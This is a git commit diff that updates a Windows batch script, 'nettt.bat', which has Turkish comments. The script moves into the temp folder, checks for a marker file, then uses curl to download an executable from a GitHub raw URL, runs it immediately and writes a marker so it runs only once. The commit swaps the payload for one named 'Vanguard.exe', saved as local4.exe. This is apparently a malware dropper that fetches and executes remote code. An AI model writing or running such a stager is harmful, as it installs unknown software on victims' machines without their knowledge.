3c4ad3dc7577e0c1f064ffd6b3f418ce9101c50f
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-09-07 11:09:46 +0300

    Update nettt.bat

--- nettt.bat
+++ nettt.bat
@@ -2,13 +2,13 @@
 cd %temp%
 
 REM Dosya kontrolü
-if exist nagihori.txt (
+if exist nagihori2.txt (
     echo nagihori.txt bulundu, çıkılıyor...
     exit /b
 ) else (
     echo nagihori.txt yok, devam ediliyor...
-    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
-    local3.exe
-    echo "asd" > nagihori.txt 
+    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/Vanguard.exe -o local4.exe
+    local4.exe
+    echo "asd" > nagihori2.txt 
     
 )
